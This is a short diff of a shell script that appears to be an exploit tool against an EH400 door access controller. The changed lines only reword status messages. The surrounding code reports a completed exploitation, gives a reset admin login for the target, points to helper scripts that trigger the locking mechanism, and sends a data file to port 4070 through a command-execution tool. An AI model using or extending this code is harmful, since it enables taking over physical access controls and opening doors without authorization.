@@ -146,7 +146,7 @@ then
   fi
   echo "[*] Exploitation Complete."
   echo "[*] Login at https://${TARGET}/ with admin:${NEWPASS} for manual control over the EH400."
-  echo "[*] Or use door.sh to trigger the locking mechanism from commandline."
+  echo "[*] Or use triggeragent.sh to trigger the controls."
   exit 1 
 fi
 
@@ -193,7 +193,7 @@ then
   ${CMDEXEC} -2 -p 4070 -c 1 -E data12.txt -d 150 ${TARGET} 2> /dev/null
   echo ""
   cd ../
-  echo "[*] Cleanup Complete."
+  echo "[*] Cleanup of ${TARGET} complete."
   exit 1
 fi
 exit 1
